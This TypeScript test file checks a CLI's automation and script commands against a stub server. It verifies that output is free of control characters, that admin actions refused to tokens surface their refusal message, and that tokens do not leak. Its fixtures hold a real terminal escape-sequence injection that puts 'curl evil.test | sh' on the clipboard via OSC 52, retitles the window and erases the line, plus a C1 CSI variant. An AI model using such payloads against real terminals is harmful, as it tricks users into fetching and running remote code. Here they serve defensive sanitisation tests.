/**
 * `braindog automations list|show|run|cancel` and `braindog scripts resume` against a stub record on node:http.
 *
 * THE STUB ANSWERS WHAT THE RECORD ANSWERS. `automations` is READ+ and sends `AutomationRow[]` with no `rule`, or one
 * `Automation` with its last ten runs with one; `automationRun`, `cancelRun` and `resumeScript` are ADMIN, and
 * `packages/record/src/index.ts`'s `admin()` refuses every `token` principal by name before it reads anything. Every
 * bearer this CLI holds is a token, so the refusal cases below carry that exact sentence: the command must show it rather
 * than swallow it, and a person reading it learns that pressing Run now is a browser's job.
 *
 * TWO CASES GO THROUGH A REAL CHILD PROCESS, because `--json` is a promise about which file descriptor holds what, and the
 * dispatch in `main.ts` is what decides a command takes the flag at all. An in-process call cannot see either.
 */

import { test } from 'node:test';
import assert from 'node:assert/strict';
import { spawn } from 'node:child_process';
import { createServer, type Server } from 'node:http';
import { mkdtempSync, rmSync } from 'node:fs';
import type { AddressInfo } from 'node:net';
import { tmpdir } from 'node:os';
import { join } from 'node:path';
import { fileURLToPath } from 'node:url';

import { automations, scripts } from '../src/automations.ts';
import type { Answer } from '../src/json.ts';
import type { AgentIo } from '../src/skills.ts';

const MAIN = fileURLToPath(new URL('../src/main.ts', import.meta.url));

/* Obviously fake, and long enough that a fragment of it in any output is findable. */
const TOKEN = ['rec_01TESTTESTTESTTESTTESTTEST', 'stub-bearer-for-tests-only-7a2e'].join('.');

const CONTEXT = { session: null, ambiguous: [], handoff: null, live: { same_repo: [], elsewhere: [] }, waiting: [], people: [], faded: 0, project: null, registers: [], next: '' };

/** Two automations as `listAutomations` sends them: one on a list's writes that has run, one on a clock that is off. */
const ROWS = [
  {
    id: 'rule.chase',
    rule: 'chase',
    name: 'Chase late invoices',
    version: 3,
    trigger: 'written',
    path: 'run',
    register: 'invoices',
    project: null,
    enabled: true,
    pack: null,
    next: null,
    open: 1,
    last: { run: 'run_01J9ZZZZZZZZZZZZZZZZZZZZZZ', state: 'failed', at: '2026-09-21T14:02:11.000Z', say: 'The mail step was refused.' },
    month: { runs: 4, done: 3, failed: 1, cancelled: 0 },
  },
  {
    id: 'rule.weekly',
    rule: 'weekly',
    name: 'weekly',
    version: 1,
    trigger: 'every',
    path: 'run',
    register: null,
    project: 'acme',
    enabled: false,
    pack: 'money-core',
    next: '2026-09-28T09:00:00.000Z',
    open: 0,
    last: null,
    month: { runs: 0, done: 0, failed: 0, cancelled: 0 },
  },
];

const CHASE = {
  ...ROWS[0],
  body: { name: 'Chase late invoices', on: { written: { register: 'invoices', op: ['update'] } }, steps: [{ notify: {} }] },
  runs: [
    {
      id: 'run_01J9ZZZZZZZZZZZZZZZZZZZZZZ',
      version: 3,
      state: 'failed',
      trigger: 'written',
      actor: 'S7',
      started_at: '2026-09-21T14:02:10.000Z',
      finished_at: '2026-09-21T14:02:11.000Z',
      say: 'The mail step was refused.',
      steps: [
        { n: 1, kind: 'wait', state: 'done', answer: null, at: '2026-09-21T14:02:10.000Z' },
        { n: 2, kind: 'notify', state: 'failed', answer: 'refused', at: '2026-09-21T14:02:11.000Z' },
        /* A `set_var` KEEPS WHAT IT WAS FILLED WITH, up to 4 KB, and a row's notes field fills it with newlines. */
        { n: 3, kind: 'set_var', state: 'done', answer: `First line of a note.\nSecond line.\n${'x'.repeat(200)}`, at: '2026-09-21T14:02:11.000Z' },
      ],
    },
  ],
};

/** Two scripts as the record's `scripts` sends them: one paused by three refused runs, one a door starts that has one. */
const SCRIPTS = [
  {
    id: 'script.gold-rate',
    script: 'gold-rate',
    title: 'Gold rate',
    version: 2,
    pack: null,
    runs: { every: '1h', door: null, rule: false },
    reads: [],
    writes: ['gold_egp'],
    egress: ['https://api.goldapi.io'],
    keys: ['goldapi'],
    status: 'paused',
    next: null,
    last: { at: '2026-09-22T10:00:00.000Z', version: 2, outcome: 'refused', say: 'gold-rate did not finish, so it wrote nothing; its log says why.' },
    refused: { in_a_row: 3, pauses_at: 3 },
    month: { runs: 4, ok: 1, refused: 3 },
  },
  {
    id: 'script.tally',
    script: 'tally',
    title: 'tally',
    version: 1,
    pack: 'money-core',
    runs: { every: null, door: 'bank-in', rule: true },
    reads: ['money'],
    writes: ['sums'],
    egress: [],
    keys: [],
    status: 'on',
    next: '2026-09-22T13:00:00.000Z',
    last: null,
    refused: { in_a_row: 1, pauses_at: 3 },
    month: { runs: 0, ok: 0, refused: 0 },
  },
];

type Seen = { method: string; args: Record<string, unknown> };

/** The record's own sentence for a token at an ADMIN door, with the words each method passes to `admin()`. */
const browserOnly = (reads?: string) => ({
  ok: false,
  refusal: { code: 'NEEDS_BROWSER_SESSION', fix: reads === undefined ? 'Open this from the app; a token cannot change what this BrainDog is.' : `Open this from the app; a token cannot ${reads}.`, at: 'principal' },
});

/* A REAL ATTACK, BYTE FOR BYTE: what a member at `append` wrote into a row, and what a `set_var` step
   filled from it. OSC 52 asks a terminal to put `curl evil.test | sh` on the clipboard, OSC 0 retitles the window, and
   the CR and CSI 2K erase the line it arrived on. `automations show` handed every byte of it to the owner's terminal. */
const HOSTILE = 'Invoice 7\u001b]52;c;Y3VybCBldmlsLnRlc3QgfCBzaA==\u0007\u001b]0;BrainDog: all clear\u0007\r\u001b[2K';
/* The same words as a terminal is allowed to see them: every control a run of one space, and nothing else touched. */
const HOSTILE_SHOWN = 'Invoice 7 ]52;c;Y3VybCBldmlsLnRlc3QgfCBzaA== ]0;BrainDog: all clear [2K';
/* THE EIGHT-BIT CSI, U+009B: the same erase-line under a second spelling, for a terminal that honours it, and one the
   copies in `brief.ts` and `session.ts` let through because they stopped at U+001F. */
const C1 = 'acme\u009b2K';

/** Every control character a printed line could carry, C0, DEL and C1 alike. */
const CONTROL = /[\u0000-\u001f\u007f-\u009f]/;

async function stub(t: { after: (fn: () => void | Promise<void>) => void }, opts: { admin?: boolean; rows?: unknown[]; scripts?: unknown[]; chase?: unknown; fix?: unknown } = {}) {
  const seen: Seen[] = [];
  const server: Server = createServer((req, res) => {
    const chunks: Buffer[] = [];
    req.on('data', (c: Buffer) => chunks.push(c));
    req.on('end', () => {
      const url = new URL(req.url ?? '/', 'http://stub');
      const method = url.pathname.replace(/^\/api\//, '');
      const raw = Buffer.concat(chunks).toString('utf8');
      const args = (raw ? JSON.parse(raw) : Object.fromEntries(url.searchParams)) as Record<string, unknown>;
      seen.push({ method, args });
      const answer = (value: unknown) => {
        res.writeHead(200, { 'content-type': 'application/json' });
        res.end(JSON.stringify(value));
      };
      const admin = opts.admin === true;
      if (method === 'context') return answer({ ok: true, value: CONTEXT });
      if (method === 'automations') {
        if (args.rule === undefined) return answer({ ok: true, value: opts.rows ?? ROWS });
        if (args.rule === 'chase' || args.rule === 'rule.chase') return answer({ ok: true, value: opts.chase ?? CHASE });
        return answer({ ok: false, refusal: { code: 'DECLARATION_UNKNOWN', fix: opts.fix ?? `There is no automation called rule.${String(args.rule)}.`, at: 'rule' } });
      }
      if (method === 'automationRun') return answer(admin ? { ok: true, value: { run: 'run_01JANEWNEWNEWNEWNEWNEWNEWN' } } : browserOnly('start an automation'));
      if (method === 'cancelRun') return answer(admin ? { ok: true, value: { run: args.run, state: 'cancelled' } } : browserOnly('stop a run'));
      if (method === 'resumeScript') return answer(admin ? { ok: true, value: { script: args.script } } : browserOnly());
      if (method === 'scripts') return answer({ ok: true, value: opts.scripts ?? SCRIPTS });
      return answer({ ok: false, refusal: { code: 'ROUTE_UNKNOWN', fix: `The stub does not answer ${method}.` } });
    });
  });
  await new Promise<void>((done) => server.listen(0, '127.0.0.1', done));
  t.after(() => new Promise<void>((done) => server.close(() => done())));
  return { base: `http://127.0.0.1:${String((server.address() as AddressInfo).port)}`, seen };
}

async function setup(t: { after: (fn: () => void | Promise<void>) => void }, opts: { admin?: boolean; rows?: unknown[]; scripts?: unknown[]; chase?: unknown; fix?: unknown } = {}) {
  const h = await stub(t, opts);
  const dir = mkdtempSync(join(tmpdir(), 'braindog-automations-'));
  t.after(() => rmSync(dir, { recursive: true, force: true }));
  const env = { XDG_CONFIG_HOME: join(dir, 'config'), APPDATA: join(dir, 'config'), BRAINDOG_HOST: h.base, BRAINDOG_TOKEN: TOKEN };
  const out: string[] = [];
  const said: string[] = [];
  const answered: Answer[] = [];
  const io: AgentIo = { env, cwd: dir, home: dir, out: (l) => void out.push(l), say: (l) => void said.push(l), headers: async () => ({}), answer: (a) => void answered.push(a) };
  return { ...h, dir, env, io, out, said, answered };
}

const called = (seen: Seen[], method: string) => seen.filter((s) => s.method === method);

test('automations list: the ones that need a look first, then one line counting the rest (AK25)', async (t) => {
  const h = await setup(t);
  assert.equal(await automations(['list'], h.io), 0);
  assert.deepEqual(h.out, [
    '1 of 2 automations needs a look, each with the name braindog automations show takes:',
    '  Chase late invoices (chase). When an entry in invoices is written, as a run. Last run failed at 21 Sep 14:02 UTC: The mail step was refused. 1 run open. This month 4 runs: 3 done, 1 failed.',
    '',
    'Of the rest, 1 is turned off. braindog automations list --all says each.',
  ]);
  assert.deepEqual(h.answered, [{ value: ROWS }]);
});

test('automations list: with nothing to look at it is two lines', async (t) => {
  const quiet = ROWS.map((r) => ({ ...r, last: null, month: { runs: 0, done: 0, failed: 0, cancelled: 0 } }));
  const h = await setup(t, { rows: quiet });
  assert.equal(await automations(['list'], h.io), 0);
  assert.deepEqual(h.out, ['None of the 2 automations needs a look.', '1 has not run yet and 1 is turned off. braindog automations list --all says each.']);
});

test('automations list --all: one line each, saying what starts it, whether it is on, and how its last run went', async (t) => {
  const h = await setup(t);
  assert.equal(await automations(['list', '--all'], h.io), 0);
  assert.deepEqual(h.out, [
    'Automations on this BrainDog, each with the name braindog automations show takes:',
    '  Chase late invoices (chase). When an entry in invoices is written, as a run. Last run failed at 21 Sep 14:02 UTC: The mail step was refused. 1 run open. This month 4 runs: 3 done, 1 failed.',
    '  Weekly (weekly). On a clock, as a run. Turned off. From money-core, for acme. Next 28 Sep 09:00 UTC. No run yet.',
  ]);
  /* THE RECORD'S OWN ROWS, for an agent to branch on, and not the sentences above taken apart again. */
  assert.deepEqual(h.answered, [{ value: ROWS }]);
  assert.deepEqual(called(h.seen, 'automations')[0]?.args, {});
});

test('automations list: none is one sentence, and an unknown flag is refused before any request', async (t) => {
  const h = await setup(t, { rows: [] });
  assert.equal(await automations(['list'], h.io), 0);
  assert.deepEqual(h.out, ['No automation you can read is set up on this BrainDog.']);

  const seen = h.seen.length;
  assert.equal(await automations(['list', '--every'], h.io), 1);
  assert.deepEqual(h.said, ['braindog automations list takes --all and --host <host>, and nothing else.']);
  assert.equal(h.seen.length, seen, 'a bad flag sends nothing');
});

test('automations show: the automation, then its recent runs step by step, and the whole answer as the value', async (t) => {
  const h = await setup(t);
  assert.equal(await automations(['show', 'chase'], h.io), 0);
  assert.deepEqual(h.out, [
    'rule.chase  Chase late invoices, version 3.',
    'When an entry in invoices is written, as a run. On.',
    'This month 4 runs: 3 done, 1 failed. 1 run open.',
    'Recent runs, newest first:',
    '  run_01J9ZZZZZZZZZZZZZZZZZZZZZZ  failed  21 Sep 14:02 UTC, by S7 on a write. The mail step was refused.',
    '    1 wait: done',
    '    2 notify: failed (refused)',
    /* ONE LINE, CUT AT 120 AFTER THE NEWLINES ARE SPACES: printed as kept, the answer broke the step list across lines
       that read as nothing, and the cut counted characters a person never saw as a line. */
    `    3 set_var: done (First line of a note. Second line. ${'x'.repeat(85)}...)`,
  ]);
  assert.deepEqual(h.answered, [{ value: CHASE }]);
  assert.deepEqual(called(h.seen, 'automations')[0]?.args, { rule: 'chase' });
});

test('automations show: an automation the record does not know is its own sentence, exit 1', async (t) => {
  const h = await setup(t);
  assert.equal(await automations(['show', 'nowhere'], h.io), 1);
  assert.deepEqual(h.said, ['There is no automation called nowhere. braindog automations list names them.']);
  assert.equal(h.answered[0]?.refusal?.code, 'DECLARATION_UNKNOWN');

  assert.equal(await automations(['show'], h.io), 1);
  assert.match(h.said[1] ?? '', /takes one automation/);
});

test('automations run and cancel: a token is refused at the ADMIN door, and the record’s sentence is shown', async (t) => {
  const h = await setup(t, { admin: false });
  assert.equal(await automations(['run', 'chase'], h.io), 1);
  assert.equal(await automations(['cancel', 'run_01J9ZZZZZZZZZZZZZZZZZZZZZZ'], h.io), 1);
  assert.deepEqual(h.said, ['Open this from the app; a token cannot start an automation.', 'Open this from the app; a token cannot stop a run.']);
  assert.deepEqual(called(h.seen, 'automationRun')[0]?.args, { rule: 'chase' });
  assert.deepEqual(called(h.seen, 'cancelRun')[0]?.args, { run: 'run_01J9ZZZZZZZZZZZZZZZZZZZZZZ' });
  assert.deepEqual(h.out, []);
});

test('automations run and cancel: where the record lets them, each says the run it touched', async (t) => {
  const h = await setup(t, { admin: true });
  assert.equal(await automations(['run', 'chase'], h.io), 0);
  assert.equal(await automations(['cancel', 'run_01J9ZZZZZZZZZZZZZZZZZZZZZZ'], h.io), 0);
  assert.deepEqual(h.out, ['chase started as run_01JANEWNEWNEWNEWNEWNEWNEWN. The next drain takes it.', 'run_01J9ZZZZZZZZZZZZZZZZZZZZZZ is cancelled. A run stopped while it waits never resumes.']);
  assert.deepEqual(h.answered, [{ value: { run: 'run_01JANEWNEWNEWNEWNEWNEWNEWN' } }, { value: { run: 'run_01J9ZZZZZZZZZZZZZZZZZZZZZZ', state: 'cancelled' } }]);
});

test('scripts resume: sends the id to resumeScript, and a token gets the ADMIN sentence', async (t) => {
  const h = await setup(t, { admin: false });
  assert.equal(await scripts(['resume', 'fx-rates'], h.io), 1);
  assert.deepEqual(h.said, ['Open this from the app; a token cannot change what this BrainDog is.']);
  assert.deepEqual(called(h.seen, 'resumeScript')[0]?.args, { script: 'fx-rates' });

  const ok = await setup(t, { admin: true });
  assert.equal(await scripts(['resume', 'fx-rates'], ok.io), 0);
  assert.deepEqual(ok.out, ['fx-rates runs again now. Three more refused runs in a row pause it again.']);
  assert.deepEqual(ok.answered, [{ value: { script: 'fx-rates' } }]);
});

test('scripts list: one line each, saying how it starts, whether it is paused, its last run and its refused runs in a row', async (t) => {
  /* THIS WAS REFUSED BEFORE ANY REQUEST, "no read that lists scripts yet", because the record had none. It has
     `scripts` now, READ+, so the list is the record's answer printed, and the value is that answer unchanged. */
  const h = await setup(t);
  assert.equal(await scripts(['list'], h.io), 0);
  assert.deepEqual(h.out, [
    'Scripts on this BrainDog:',
    '  Gold rate (gold-rate). Every hour. Paused: its last 3 runs were refused, and it runs again only when somebody resumes it in the app. Last run refused at 22 Sep 10:00 UTC: gold-rate did not finish, so it wrote nothing; its log says why. This month 4 runs: 1 ok, 3 refused. Writes gold_egp. Fetches from https://api.goldapi.io.',
    '  Tally (tally). When bank-in receives an arrival, or when a rule runs it. From money-core. Next 22 Sep 13:00 UTC. No run yet. 1 refused run in a row; 3 pause it. Reads money. Writes sums.',
  ]);
  assert.deepEqual(h.answered, [{ value: SCRIPTS }]);
  assert.deepEqual(called(h.seen, 'scripts')[0]?.args, {});
});

test('scripts list: none is one sentence, and a verb it does not know is refused before any request', async (t) => {
  const h = await setup(t, { scripts: [] });
  assert.equal(await scripts(['list'], h.io), 0);
  assert.deepEqual(h.out, ['No script you can read is installed on this BrainDog.']);

  const seen = h.seen.length;
  assert.equal(await scripts(['list', '--all'], h.io), 1);
  assert.equal(await scripts(['show', 'tally'], h.io), 1);
  assert.deepEqual(h.said, ['braindog scripts list takes --host <host>, and nothing else.', 'braindog scripts takes list, or resume <id>, and --host.']);
  assert.equal(h.seen.length, seen, 'a bad flag or verb sends nothing');
});

/** CHASE with every string a member or a pack could have supplied carrying the attack's bytes. */
const HOSTILE_CHASE = {
  ...CHASE,
  name: HOSTILE,
  register: HOSTILE,
  pack: HOSTILE,
  project: C1,
  next: HOSTILE,
  runs: [{ ...CHASE.runs[0], actor: HOSTILE, say: HOSTILE, steps: [{ n: 1, kind: 'set_var', state: 'done', answer: HOSTILE, at: '2026-09-21T14:02:11.000Z' }] }],
};

const controlled = (lines: string[]) => lines.filter((l) => CONTROL.test(l)).map((l) => JSON.stringify(l));

test('automations show: a step answer, a name and a note a member wrote reach the terminal with no control character in them', async (t) => {
  const h = await setup(t, { chase: HOSTILE_CHASE });
  assert.equal(await automations(['show', 'chase'], h.io), 0);
  assert.deepEqual(controlled(h.out), [], 'a printed line carries a control character');
  /* THE WORDS STAY, READABLE AS WHAT THEY ARE: an owner debugging the run should see that somebody wrote an escape
     sequence into the row, not a blank where it was. */
  assert.equal(h.out.at(-1), `    1 set_var: done (${HOSTILE_SHOWN})`);
  assert.ok(h.out.some((l) => l.includes(`by ${HOSTILE_SHOWN} on a write. ${HOSTILE_SHOWN}.`)));
  assert.ok(h.out.some((l) => l.includes('for acme 2K')));
  /* --json HANDS AN AGENT THE RECORD'S VALUE UNCHANGED: the scrub is for a terminal, and the bytes are still data. */
  assert.deepEqual(h.answered, [{ value: HOSTILE_CHASE }]);
});

test('automations list and scripts list: every name, list, pack, project and last word a line prints is scrubbed', async (t) => {
  const rows = [{ ...ROWS[0], name: HOSTILE, register: HOSTILE, pack: HOSTILE, project: C1, last: { ...ROWS[0]?.last, state: HOSTILE, say: HOSTILE } }];
  const scriptRows = [
    {
      ...SCRIPTS[0],
      title: HOSTILE,
      pack: C1,
      runs: { every: HOSTILE, door: HOSTILE, rule: true },
      reads: [HOSTILE],
      writes: [C1],
      egress: [HOSTILE],
      next: HOSTILE,
      last: { ...SCRIPTS[0]?.last, outcome: HOSTILE, say: HOSTILE },
    },
  ];
  const h = await setup(t, { rows, scripts: scriptRows });
  assert.equal(await automations(['list', '--all'], h.io), 0);
  assert.equal(await scripts(['list'], h.io), 0);
  assert.deepEqual(controlled(h.out), [], 'a printed line carries a control character');
  assert.deepEqual(h.answered, [{ value: rows }, { value: scriptRows }]);
});

test("automations show: a refusal's sentence is scrubbed for the terminal and kept whole for an agent", async (t) => {
  const h = await setup(t, { fix: HOSTILE });
  assert.equal(await automations(['show', 'nowhere'], h.io), 1);
  assert.deepEqual(h.said, [HOSTILE_SHOWN]);
  assert.equal(h.answered[0]?.refusal?.fix, HOSTILE);
});

/* A FIX THAT IS NOT A STRING STILL REFUSES; IT DOES NOT THROW. `@braindog/client` passes any `{ ok: false, refusal }`
   through without looking inside it, and measured against the first cut of this scrub, a `fix` of 7 threw
   `said.replace is not a function` out of `show`, so `main.ts` printed that and the refusal's code never reached the
   `--json` envelope. Before the scrub the same answer exited 1 with its code kept, and it still must. */
test("automations show: a refusal whose fix is not a string is still a refusal, with its code kept for an agent", async (t) => {
  const h = await setup(t, { fix: 7 });
  assert.equal(await automations(['show', 'nowhere'], h.io), 1);
  assert.equal(h.answered[0]?.refusal?.code, 'DECLARATION_UNKNOWN');
});

type Ran = { code: number | null; stdout: string; stderr: string };

const ran = (args: string[], env: NodeJS.ProcessEnv, cwd: string): Promise<Ran> =>
  new Promise((done) => {
    const child = spawn(process.execPath, [MAIN, ...args], { env, cwd, stdio: ['ignore', 'pipe', 'pipe'] });
    let stdout = '';
    let stderr = '';
    child.stdout.on('data', (d) => (stdout += String(d)));
    child.stderr.on('data', (d) => (stderr += String(d)));
    child.on('close', (code) => done({ code, stdout, stderr }));
  });

test('braindog automations list --json: one document on stdout, holding the rows, and no token anywhere', async (t) => {
  const h = await setup(t);
  const out = await ran(['automations', 'list', '--json'], { ...process.env, ...h.env }, h.dir);
  assert.equal(out.code, 0, out.stderr);
  assert.equal(out.stdout.trimEnd().includes('\n'), false, `stdout is not one line: ${out.stdout}`);
  assert.equal(`${out.stdout}${out.stderr}`.includes(TOKEN), false, 'the token reached an output');
  assert.deepEqual(JSON.parse(out.stdout), { ok: true, value: ROWS });
});

test('braindog scripts resume --json: the ADMIN refusal is the envelope’s code, not a sentence to parse', async (t) => {
  const h = await setup(t);
  const out = await ran(['scripts', 'resume', 'fx-rates', '--json'], { ...process.env, ...h.env }, h.dir);
  assert.equal(out.code, 1);
  assert.deepEqual(JSON.parse(out.stdout), { ok: false, refusals: [browserOnly().refusal] });
  assert.equal(`${out.stdout}${out.stderr}`.includes(TOKEN), false, 'the token reached an output');
});

test('braindog automations show --json: the escape bytes stay in the value, JSON-escaped, and never raw on stdout', async (t) => {
  const h = await setup(t, { chase: HOSTILE_CHASE });
  const out = await ran(['automations', 'show', 'chase', '--json'], { ...process.env, ...h.env }, h.dir);
  assert.equal(out.code, 0, out.stderr);
  /* C0 ONLY, BECAUSE THAT IS WHAT JSON.stringify ESCAPES: measured, the U+009B in `project` leaves `main.ts`'s `emit` as
     the raw bytes C2 9B, since JSON allows it unescaped. The ESC, BEL and CR above are all C0 and all escaped. */
  assert.equal(/[\u0000-\u001f]/.test(out.stdout.trimEnd()), false, `stdout carries a raw control character: ${JSON.stringify(out.stdout)}`);
  assert.deepEqual(JSON.parse(out.stdout), { ok: true, value: HOSTILE_CHASE });
});
